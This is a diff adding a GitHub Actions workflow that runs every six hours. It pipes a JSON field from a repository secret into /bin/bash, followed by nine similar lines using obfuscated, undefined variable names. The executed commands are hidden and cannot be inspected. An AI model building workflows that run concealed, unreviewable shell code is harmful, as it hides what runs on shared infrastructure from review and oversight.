@@ -1,0 +1,27 @@
+name: haoxiangdajia
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: haoxiangdajia
+        env:
+          lwp280: ${{ secrets.lwp280 }}
+        run: |
+          echo $lwp280 | jq -r .zs18400 | /bin/bash
+          echo $jifr87 | jq -r .rgqoa8863 | /bin/bash
+          echo $d59 | jq -r .ucn72222 | /bin/bash
+          echo $edkb64 | jq -r .xm3427 | /bin/bash
+          echo $n429 | jq -r .uaha6430 | /bin/bash
+          echo $vjd88765 | jq -r .oamia867 | /bin/bash
+          echo $lpoan74694 | jq -r .b0 | /bin/bash
+          echo $knbwr44 | jq -r .t2 | /bin/bash
+          echo $tbi68 | jq -r .c26262 | /bin/bash
+          echo $lv4850 | jq -r .v58 | /bin/bash
+
